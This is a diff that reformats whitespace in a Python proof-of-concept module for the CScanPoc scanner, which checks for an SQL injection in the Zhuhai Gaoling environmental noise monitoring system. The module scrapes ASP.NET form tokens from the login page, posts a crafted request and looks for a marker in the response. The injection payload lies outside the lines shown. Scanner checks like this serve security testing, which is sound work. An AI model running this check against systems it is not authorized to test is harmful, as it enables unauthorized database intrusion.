@@ -5,11 +5,12 @@ from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import re
 import urllib
 
+
 class Vuln(ABVuln):
-    vuln_id = 'Huanjingjiance_0001' # 平台漏洞编号，留空
+    vuln_id = 'Huanjingjiance_0001'  # 平台漏洞编号，留空
     name = '珠海高凌环境监测系统 SQL注入'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = '2015-09-24'  # 漏洞公布时间
     desc = '''
         珠海高凌环境噪声自动监测系统3.0.0-1 参数过滤不严谨，造成SQL注入漏洞。
@@ -19,6 +20,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = '珠海高凌环境监测系统'  # 漏洞应用名称
     product_version = '3.0.0-1'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = '44b177ca-f05b-4b34-bfbf-847cd6e09458'
@@ -32,13 +34,13 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
-            hh =hackhttp.hackhttp()
+
+            hh = hackhttp.hackhttp()
             preWork = self.target + '/Portal/Login.aspx'
             code, head, res, errcode, _ = hh.http(preWork)
             if code != 200:
                 return
-            patten = re.findall(r'value=\"(?P<aa>[\w\+\/\=]{1,}?)\"',res)
+            patten = re.findall(r'value=\"(?P<aa>[\w\+\/\=]{1,}?)\"', res)
             if patten:
                 p1 = urllib.quote(patten[0])
                 p2 = urllib.quote(patten[1])
@@ -59,7 +61,7 @@ __EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE='''+p1+'''&__EVENTVALIDATION='''+p2+
     #print '-d "'+payload+'" '+preWork
                 code, head, res, errcode, _ = hh.http(preWork, raw=raw)
                 if code == 200 and "testvul" in res:
-                    #security_hole(preWork)
+                    # security_hole(preWork)
                     self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                         target=self.target, name=self.vuln.name))
 
@@ -68,6 +70,7 @@ __EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE='''+p1+'''&__EVENTVALIDATION='''+p2+
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
